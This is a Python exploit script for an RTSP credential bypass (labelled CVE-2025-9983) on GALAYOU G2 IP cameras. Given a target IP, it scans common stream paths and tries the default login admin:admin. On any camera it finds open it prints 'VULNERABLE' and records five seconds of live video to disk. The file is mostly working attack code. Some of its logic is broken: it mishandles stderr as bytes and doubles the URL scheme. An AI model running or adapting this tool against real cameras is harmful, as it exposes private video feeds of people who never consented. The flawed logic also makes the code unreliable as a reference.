# CVE-2025-9983 - GALAYOU G2 RTSP Creds bypass
# Author: Sohaib E.B.  info@cybersec.sohaib.eu
# Version: 1.0
# Date: 26/10/2025
import socket
import subprocess
import sys
import time

class RTSPBypassExploit:
    def __init__(self, target):
        self.target = target
        self.port = 554
        self.streams = []
        
    def scan_streams(self):
        paths = [
            "/live/main", "/stream1", "/stream2", "/h264", 
            "/11", "/12", "/cam/realmonitor", "/media/video1",
            "/main", "/sub", "/video", "/live"
        ]
        
        for path in paths:
            url = f"rtsp://{self.target}:{self.port}{path}"
            if self.check_stream(url):
                self.streams.append(url)
                
            test_url = f"rtsp://admin:admin@{self.target}:{self.port}{path}"
            if self.check_stream(test_url):
                self.streams.append(test_url)
                
    def check_stream(self, url):
        try:
            cmd = [
                "ffprobe",
                "-loglevel", "error",
                "-rtsp_transport", "tcp",
                "-timeout", "3000000",
                "-i", url
            ]
            result = subprocess.run(cmd, capture_output=True, timeout=8)
            return result.returncode == 0 or "401" not in result.stderr
        except:
            return False
            
    def verify_bypass(self):
        for stream in self.streams[:]:
            clean_url = stream.split('@')[-1] if '@' in stream else stream
            clean_url = f"rtsp://{clean_url}"
            if self.check_stream(clean_url):
                print(f"VULNERABLE: {clean_url}")
                self.capture_stream(clean_url)
            else:
                self.streams.remove(stream)
                
    def capture_stream(self, url):
        output = f"capture_{self.target}_{int(time.time())}.mp4"
        try:
            cmd = [
                "ffmpeg", "-y",
                "-rtsp_transport", "tcp",
                "-i", url,
                "-t", "5",
                "-c", "copy",
                output
            ]
            subprocess.run(cmd, timeout=10, capture_output=True)
        except:
            pass
            
    def exploit(self):
        print(f"Target: {self.target}")
        self.scan_streams()
        if self.streams:
            self.verify_bypass()
            return True
        return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target_ip>")
        sys.exit(1)
        
    target = sys.argv[1]
    exploit = RTSPBypassExploit(target)
    
    if exploit.exploit():
        print("Exploitation successful")
    else:
        print("No vulnerable streams found")
